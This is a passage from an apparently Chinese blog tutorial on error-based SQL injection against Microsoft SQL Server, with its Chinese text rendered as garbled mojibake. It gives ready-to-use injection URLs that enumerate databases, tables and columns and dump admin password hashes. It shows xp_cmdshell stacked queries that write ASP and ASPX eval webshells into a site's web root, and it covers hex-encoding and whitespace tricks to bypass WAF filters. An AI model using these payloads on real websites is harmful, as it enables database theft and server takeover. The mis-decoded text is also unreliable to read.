title="æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°"></a><strong>æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°</strong></h4><p><code>db_name()</code>ï¼šå½“å‰ä½¿ç”¨çš„æ•°æ®åº“åç§°ã€‚</p><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜abcâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><h4 id="æŸ¥è¯¢å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·"><a href="#æŸ¥è¯¢å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·" class="headerlink" title="æŸ¥è¯¢å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·"></a><strong>æŸ¥è¯¢å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·</strong></h4><p><code>User_Name()</code>ï¼šå½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·ã€‚</p><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜dboâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><p>æ³¨æ„ï¼šå¦‚æœçœ‹åˆ°dboï¼Œé‚£ä¹ˆå¤šåŠå½“å‰æ•°æ®åº“çš„ç”¨æˆ·æ˜¯dbaæƒé™ã€‚</p><h4 id="æŸ¥è¯¢å…¶ä»–æ•°æ®åº“åç§°"><a href="#æŸ¥è¯¢å…¶ä»–æ•°æ®åº“åç§°" class="headerlink" title="æŸ¥è¯¢å…¶ä»–æ•°æ®åº“åç§°"></a><strong>æŸ¥è¯¢å…¶ä»–æ•°æ®åº“åç§°</strong></h4><p><strong>çˆ†å…¶ä»–æ•°æ®åº“:</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span>Â Â and (SELECT top <span class="hljs-number">1</span> Name FROM Master..SysDatabases)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜masterâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><p><strong>å†çˆ†å…¶ä»–çš„æ•°æ®åº“åˆ™è¿™ä¹ˆå†™ï¼š</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>Â Â <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> top <span class="hljs-number">1</span> <span class="hljs-type">Name</span> <span class="hljs-keyword">FROM</span> Master..SysDatabases <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;master&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p><strong>ç»§ç»­çš„è¯è¦è¿™ä¹ˆå†™ï¼š</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>Â Â <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> top <span class="hljs-number">1</span> <span class="hljs-type">Name</span> <span class="hljs-keyword">FROM</span> Master..SysDatabases <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;master&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨å"><a href="#æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨å" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨å"></a><strong>æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨å</strong></h4><p>æŸ¥è¡¨åï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>Â Â <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> abc.sys.all_objects <span class="hljs-keyword">where</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&#x27;U&#x27;</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span>)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜departâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><p>å†çˆ†å…¶ä»–è¡¨ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>Â Â <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> abc.sys.all_objects <span class="hljs-keyword">where</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&#x27;U&#x27;</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;depart&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>å†ç»§ç»­ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> abc.sys.all_objects <span class="hljs-keyword">where</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&#x27;U&#x27;</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;depart&#x27;</span>,<span class="hljs-string">&#x27;worker&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="æŸ¥è¯¢è¡¨ä¸­çš„åˆ—åæˆ–è€…æ˜¯å­—æ®µå"><a href="#æŸ¥è¯¢è¡¨ä¸­çš„åˆ—åæˆ–è€…æ˜¯å­—æ®µå" class="headerlink" title="æŸ¥è¯¢è¡¨ä¸­çš„åˆ—åæˆ–è€…æ˜¯å­—æ®µå"></a><strong>æŸ¥è¯¢è¡¨ä¸­çš„åˆ—åæˆ–è€…æ˜¯å­—æ®µå</strong></h4><p>æŸ¥å­—æ®µåï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>Â Â <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> abc.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;depart&#x27;</span>)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜IDâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><p>å†çˆ†å…¶ä»–å­—æ®µï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> abc.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;depart&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;ID&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>å†ç»§ç»­ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>Â Â <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> abc.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;depart&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;ID&#x27;</span>,<span class="hljs-string">&#x27;NAME&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="çˆ†æ•°æ®"><a href="#çˆ†æ•°æ®" class="headerlink" title="çˆ†æ•°æ®"></a><strong>çˆ†æ•°æ®</strong></h4><p>æŸ¥è¯¢æ•°æ®ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span> and (select top <span class="hljs-number">1</span> password from depart)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜B5A1EF8730200F93E50F4F5DEBBCAC0Bâ€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><h4 id="å†™å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#å†™å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="å†™å…¥ä¸€å¥è¯æœ¨é©¬"></a><strong>å†™å…¥ä¸€å¥è¯æœ¨é©¬</strong></h4><p>å¦‚æœæ•°æ®çš„æƒé™æ˜¯dbaï¼Œä¸”çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªè¯­å¥æ¥å†™ä¸€å¥è¯æœ¨é©¬è¿›å»ï¼š</p><p>aspæœ¨é©¬ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span>;exec master..xp_cmdshellÂ <span class="hljs-string">&#x27;echoÂ &quot;&lt;%@Â LANGUAGE=VBSCRIPTÂ %&gt;;&lt;%evalÂ request(chr(35))%&gt;&#x27;</span><span class="hljs-string">&#x27;&quot;Â &gt;Â d:\KfSite\kaifeng\2.asp&#x27;</span>--</span></code></pre></div></div><p>aspxæœ¨é©¬ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span>;exec master..xp_cmdshellÂ <span class="hljs-string">&#x27;echoÂ &quot;&lt;%@Â LANGUAGE=JscriptÂ %&gt;;&lt;%eval(Request(&quot;sb&quot;),&quot;unsafe&quot;)%&gt;&#x27;</span><span class="hljs-string">&#x27;&quot;Â &gt;C:\inetpub\wwwroot\2.aspx&#x27;</span>Â --</span></code></pre></div></div><p>åŸç†æ˜¯sql serveræ”¯æŒå †å æŸ¥è¯¢ï¼Œåˆ©ç”¨<code>xp_cmdshell</code>å¯ä»¥æ‰§è¡ŒcmdæŒ‡ä»¤ï¼ŒcmdæŒ‡ä»¤ä¸­ç”¨ã€echo å†…å®¹ &gt; æ–‡ä»¶ã€‘å¯ä»¥å†™æ–‡ä»¶åˆ°ç£ç›˜é‡Œé¢ã€‚</p><h2 id="åˆ©ç”¨hexç¼–ç ç»•è¿‡WAF"><a href="#åˆ©ç”¨hexç¼–ç ç»•è¿‡WAF" class="headerlink" title="åˆ©ç”¨hexç¼–ç ç»•è¿‡WAF"></a><strong>åˆ©ç”¨hexç¼–ç ç»•è¿‡WAF</strong></h2><p><a href="http://www.xxx.com/xxx/xxx.aspx?username=xxx">http://www.xxx.com/xxx/xxx.aspx?username=xxx</a> åˆ©ç”¨ç«ç‹æµè§ˆå™¨ä¸­çš„hackbarå·¥å…·çš„Encodingåº•ä¸‹çš„â€œHEX Encodingâ€è½»æ¾æŠŠå­—ç¬¦ä¸²ç¼–ç æˆä¸ºå¯ä»¥åˆ©ç”¨çš„hex</p><p>ç„¶ååˆ©ç”¨æŠ¥é”™æ³¨å…¥å°±å¯ä»¥æ³¨å…¥è¿™ä¸ªç½‘ç«™ã€‚</p><h3 id="çˆ†æ•°æ®åº“ç‰ˆæœ¬"><a href="#çˆ†æ•°æ®åº“ç‰ˆæœ¬" class="headerlink" title="çˆ†æ•°æ®åº“ç‰ˆæœ¬"></a><strong>çˆ†æ•°æ®åº“ç‰ˆæœ¬</strong></h3><p><code>select convert(int,@@version)</code></p><p>hexç¼–ç åï¼š0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</p><p>ç„¶åä½¿ç”¨å¦‚ä¸‹æ–¹å¼æ³¨å…¥ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.com/xxx/xxx.aspx?username=xxx&#x27;;dEcLaReÂ @sÂ vArChAr(<span class="hljs-number">8000</span>) sEt @s=<span class="hljs-number">0</span>x<span class="hljs-number">73656</span>c<span class="hljs-number">65637420636</span>f<span class="hljs-number">6</span>e<span class="hljs-number">7665727428696</span>e<span class="hljs-number">742</span>c<span class="hljs-number">404076657273696</span>f<span class="hljs-number">6</span>e<span class="hljs-number">29</span> eXeC(@s)â€“</span></code></pre></div></div><p>æŠ¥é”™ä¿¡æ¯ï¼š</p><p>åœ¨å°† nvarchar å€¼ â€˜Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft CorporationStandard Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)â€˜ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚</p><p>æ³¨æ„åé¢çš„æ³¨å…¥è¯­å¥ï¼š</p><p>dEcLaReÂ @sÂ vArChAr(8000) //å£°æ˜ä¸€ä¸ªå±€éƒ¨å˜é‡@sï¼Œç±»å‹ä¸ºvarchar(8000)</p><p>sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 //ç»™@sèµ‹å€¼ï¼Œä¸ºâ€œselect convert(int,@@version)â€çš„åå…­è¿›åˆ¶ç¼–ç </p><p>eXeC(@s) //è°ƒç”¨å‡½æ•°exec()æ‰§è¡Œâ€œ@sâ€ä¸­çš„å†…å®¹ã€‚</p><h3 id="çˆ†å½“å‰æ•°æ®åº“"><a href="#çˆ†å½“å‰æ•°æ®åº“" class="headerlink" title="çˆ†å½“å‰æ•°æ®åº“"></a><strong>çˆ†å½“å‰æ•°æ®åº“</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,db_name())</span></code></pre></div></div><h3 id="çˆ†å½“å‰ç”¨æˆ·"><a href="#çˆ†å½“å‰ç”¨æˆ·" class="headerlink" title="çˆ†å½“å‰ç”¨æˆ·"></a><strong>çˆ†å½“å‰ç”¨æˆ·</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,User_Name())</span></code></pre></div></div><h3 id="çˆ†è¡¨"><a href="#çˆ†è¡¨" class="headerlink" title="çˆ†è¡¨"></a><strong>çˆ†è¡¨</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> abc[æ•°æ®åº“å].sys.all_objects <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span>â€™Uâ€™ <span class="hljs-keyword">AND</span> is_ms_shipped<span class="hljs-operator">=</span><span class="hljs-number">0</span>)) <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> abc[æ•°æ®åº“å].sys.all_objects <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span>â€™Uâ€™ <span class="hljs-keyword">AND</span> is_ms_shipped<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (â€˜CMS_ArticleClassâ€™)))</span></code></pre></div></div><h3 id="çˆ†å­—æ®µ"><a href="#çˆ†å­—æ®µ" class="headerlink" title="çˆ†å­—æ®µ"></a><strong>çˆ†å­—æ®µ</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> COLUMN_NAME <span class="hljs-keyword">from</span> abc[æ•°æ®åº“å].information_schema.columns <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span>â€™CMS_Userinfo[è¡¨å]â€™)) <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> COLUMN_NAME <span class="hljs-keyword">from</span> abc[æ•°æ®åº“å].information_schema.columns <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span>â€™CMS_Userinfo[è¡¨å]â€™ <span class="hljs-keyword">and</span> COLUMN_NAME <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (â€˜idâ€™)))</span></code></pre></div></div><h3 id="çˆ†æ•°æ®-1"><a href="#çˆ†æ•°æ®-1" class="headerlink" title="çˆ†æ•°æ®"></a><strong>çˆ†æ•°æ®</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> username <span class="hljs-keyword">from</span> CMS_Admin)) <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> password <span class="hljs-keyword">from</span> CMS_Admin))</span></code></pre></div></div><h2 id="SQLæ³¨å…¥ä¹‹ä½ é—®æˆ‘ç­”å°çŸ¥è¯†"><a href="#SQLæ³¨å…¥ä¹‹ä½ é—®æˆ‘ç­”å°çŸ¥è¯†" class="headerlink" title="SQLæ³¨å…¥ä¹‹ä½ é—®æˆ‘ç­”å°çŸ¥è¯†"></a><strong>SQLæ³¨å…¥ä¹‹ä½ é—®æˆ‘ç­”å°çŸ¥è¯†</strong></h2><h3 id="id-1ï¼Œé¡µé¢å¦‚æœè¿”å›æ­£ç¡®é¡µé¢è¯´æ˜æ˜¯æœ‰æ³¨å…¥ï¼Œé‚£-1å¯ä»¥å—ï¼Ÿï¼ˆwww-test-com-xsn-php-id-12-1ï¼‰"><a href="#id-1ï¼Œé¡µé¢å¦‚æœè¿”å›æ­£ç¡®é¡µé¢è¯´æ˜æ˜¯æœ‰æ³¨å…¥ï¼Œé‚£-1å¯ä»¥å—ï¼Ÿï¼ˆwww-test-com-xsn-php-id-12-1ï¼‰" class="headerlink" title="id-1ï¼Œé¡µé¢å¦‚æœè¿”å›æ­£ç¡®é¡µé¢è¯´æ˜æ˜¯æœ‰æ³¨å…¥ï¼Œé‚£+1å¯ä»¥å—ï¼Ÿï¼ˆwww.test.com/xsn.php?id=12+1ï¼‰"></a><strong>id-1ï¼Œé¡µé¢å¦‚æœè¿”å›æ­£ç¡®é¡µé¢è¯´æ˜æ˜¯æœ‰æ³¨å…¥ï¼Œé‚£+1å¯ä»¥å—ï¼Ÿ</strong>ï¼ˆ<a href="http://www.test.com/xsn.php?id=12+1%EF%BC%89">www.test.com/xsn.php?id=12+1ï¼‰</a></h3><p>ä¸è¡Œï¼Œå› ä¸ºåŠ å·åœ¨urlé‡Œé¢æ˜¯ç©ºæ ¼çš„æ„æ€ã€‚</p><h3 id="ä½ çŸ¥é“mysqlé‡Œæœ‰å‡ ç§æ³¨é‡Šæ–¹å¼å—ï¼Ÿ"><a href="#ä½ çŸ¥é“mysqlé‡Œæœ‰å‡ ç§æ³¨é‡Šæ–¹å¼å—ï¼Ÿ" class="headerlink" title="ä½ çŸ¥é“mysqlé‡Œæœ‰å‡ ç§æ³¨é‡Šæ–¹å¼å—ï¼Ÿ"></a><strong>ä½ çŸ¥é“mysqlé‡Œæœ‰å‡ ç§æ³¨é‡Šæ–¹å¼å—ï¼Ÿ</strong></h3><p>ä¸‰ç§ï¼š</p><p>â‘ .# è¿™ä¸ªæ³¨é‡Šç›´åˆ°è¯¥è¡Œç»“æŸï¼›</p><p>â‘¡./æ³¨é‡Šå¤šè¡Œ/ï¼›</p><p>â‘¢.â€“+ è¿™ä¸ªæ³¨é‡Šç›´åˆ°è¯¥è¡Œç»“æŸã€‚</p><p>ç¬¬ä¸‰ç§éœ€è¦è§£é‡Šä¸€ä¸‹ï¼Œå› ä¸ºä¹‹å‰æˆ‘ä¸çŸ¥é“è¿™ä¸ªæ–¹æ³•ï¼Œè¯´â€˜â€“â€™æ˜¯æ³¨é‡Šç¬¦æˆ‘è¿˜å¤§æ¦‚æœ‰å°è±¡ï¼Œä½†æ˜¯â€“+å°±æ‡µã€‚</p><p>å…¶å®æ˜¯â€“ ï¼Œæ³¨æ„â€“çš„åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚ä½†æ˜¯åœ¨urlé‡Œä½ ç›´æ¥ç©ºæ ¼ä¼šè¢«æµè§ˆå™¨ç›´æ¥å¤„ç†æ‰ï¼Œå°±åˆ°ä¸äº†æ•°æ®åº“é‡Œã€‚</p><p>æ‰€ä»¥ç‰¹æ„ç”¨åŠ å·ä»£æ›¿ã€‚</p><h3 id="â€œselect-select-from-adminâ€å¯ä»¥æ‰§è¡Œå—ï¼Ÿ-å€˜è‹¥ä¸å¯ä»¥è¯·è¯´æ˜ã€‚"><a href="#â€œselect-select-from-adminâ€å¯ä»¥æ‰§è¡Œå—ï¼Ÿ-å€˜è‹¥ä¸å¯ä»¥è¯·è¯´æ˜ã€‚" class="headerlink" title="â€œselect select * from adminâ€å¯ä»¥æ‰§è¡Œå—ï¼Ÿ****å€˜è‹¥ä¸å¯ä»¥è¯·è¯´æ˜ã€‚"></a><strong>â€œselect select * from adminâ€å¯ä»¥æ‰§è¡Œå—ï¼Ÿ****å€˜è‹¥ä¸å¯ä»¥è¯·è¯´æ˜ã€‚</strong></h3><p>ä¸å¯ä»¥æ‰§è¡Œï¼Œåœ¨ä½¿ç”¨selectåŒå±‚çš„æ—¶å€™è¦æŠŠç¬¬äºŒä¸ªæ‹¬èµ·æ¥ï¼Œå¦åˆ™æ— æ•ˆã€‚</p><h3 id="å€˜è‹¥ç©ºæ ¼è¿‡æ»¤äº†ï¼Œä½ çŸ¥é“æœ‰å“ªäº›å¯ä»¥ç»•è¿‡å—ï¼Ÿæˆ–è€…è¯´ä½ çŸ¥é“å“ªäº›å¯ä»¥æ›¿ä»£ç©ºæ ¼å—ï¼Ÿ"><a href="#å€˜è‹¥ç©ºæ ¼è¿‡æ»¤äº†ï¼Œä½ çŸ¥é“æœ‰å“ªäº›å¯ä»¥ç»•è¿‡å—ï¼Ÿæˆ–è€…è¯´ä½ çŸ¥é“å“ªäº›å¯ä»¥æ›¿ä»£ç©ºæ ¼å—ï¼Ÿ" class="headerlink" title="å€˜è‹¥ç©ºæ ¼è¿‡æ»¤äº†ï¼Œä½ çŸ¥é“æœ‰å“ªäº›å¯ä»¥ç»•è¿‡å—ï¼Ÿæˆ–è€…è¯´ä½ çŸ¥é“å“ªäº›å¯ä»¥æ›¿ä»£ç©ºæ ¼å—ï¼Ÿ"></a><strong>å€˜è‹¥ç©ºæ ¼è¿‡æ»¤äº†ï¼Œä½ çŸ¥é“æœ‰å“ªäº›å¯ä»¥ç»•è¿‡å—ï¼Ÿæˆ–è€…è¯´ä½ çŸ¥é“å“ªäº›å¯ä»¥æ›¿ä»£ç©ºæ ¼å—ï¼Ÿ</strong></h3><p>è¿™äº›æ˜¯ç©ºå­—ç¬¦ã€‚</p><p>æ¯”å¦‚un%0aionä¼šè¢«å½“åšunionæ¥å¤„ç†ã€‚</p><p>å‡å¦‚ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œå¯èƒ½çš„sqlè¯­å¥å°±ä¼šå˜æˆï¼šselect from messages where uid=45or1=1</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>//</code>æ¥æ›¿æ¢ç©ºæ ¼ï¼š<code>http://www.xxx.com/index.php?id=45//or/**/1=1</code></p><p>å¦å¤–ï¼š<code>%09 %0A %0D + /|â€“|/ /@â€“|/ /?â€“|/ /|%20â€“%20|/</code> éƒ½å¯ä»¥æ›¿ä»£ç©ºæ ¼ã€‚</p><h3 id="Windowsä¸‹çš„Oracleæ•°æ®åº“æ˜¯ä»€ä¹ˆæƒé™ï¼Ÿ"><a href="#Windowsä¸‹çš„Oracleæ•°æ®åº“æ˜¯ä»€ä¹ˆæƒé™ï¼Ÿ" class="headerlink" title="Windowsä¸‹çš„Oracleæ•°æ®åº“æ˜¯ä»€ä¹ˆæƒé™ï¼Ÿ"></a><strong>Windowsä¸‹çš„Oracleæ•°æ®åº“æ˜¯ä»€ä¹ˆæƒé™ï¼Ÿ</strong></h3><p>Windowsä¸‹çš„Oracleæ•°æ®åº“ï¼Œå¿…é¡»ä»¥systemæƒé™è¿è¡Œã€‚</p><h3 id="SQLæ³¨å…¥å’ŒSQLç›²æ³¨æœ‰ä½•å·®åˆ«ï¼Ÿ"><a href="#SQLæ³¨å…¥å’ŒSQLç›²æ³¨æœ‰ä½•å·®åˆ«ï¼Ÿ" class="headerlink" title="SQLæ³¨å…¥å’ŒSQLç›²æ³¨æœ‰ä½•å·®åˆ«ï¼Ÿ"></a><strong>SQLæ³¨å…¥å’ŒSQLç›²æ³¨æœ‰ä½•å·®åˆ«ï¼Ÿ</strong></h3><p>åœ¨å¸¸è§„çš„SQLæ³¨å…¥ä¸­ï¼Œåº”ç”¨è¿”å›æ•°æ®åº“ä¸­çš„æ•°æ®å¹¶å‘ˆç°ç»™ä½ ï¼Œè€Œåœ¨SQLç›²æ³¨æ¼æ´ä¸­ï¼Œä½ åªèƒ½è·å–åˆ†åˆ«ä¸æ³¨å…¥ä¸­çš„çœŸå‡æ¡ä»¶ç›¸å¯¹åº”çš„ä¸¤ä¸ªä¸åŒå“åº”ï¼Œåº”ç”¨ä¼šé’ˆå¯¹çœŸå‡æ¡ä»¶è¿”å›ä¸åŒçš„å€¼ï¼Œä½†æ˜¯æ”»å‡»è€…æ— æ³•æ£€ç´¢æŸ¥è¯¢ç»“æœã€‚</p><h3 id="ä»€ä¹ˆæ˜¯å¼•å‘SQLæ³¨å…¥æ¼æ´çš„ä¸»è¦åŸå› ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å¼•å‘SQLæ³¨å…¥æ¼æ´çš„ä¸»è¦åŸå› ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å¼•å‘SQLæ³¨å…¥æ¼æ´çš„ä¸»è¦åŸå› ï¼Ÿ"></a><strong>ä»€ä¹ˆæ˜¯å¼•å‘SQLæ³¨å…¥æ¼æ´çš„ä¸»è¦åŸå› 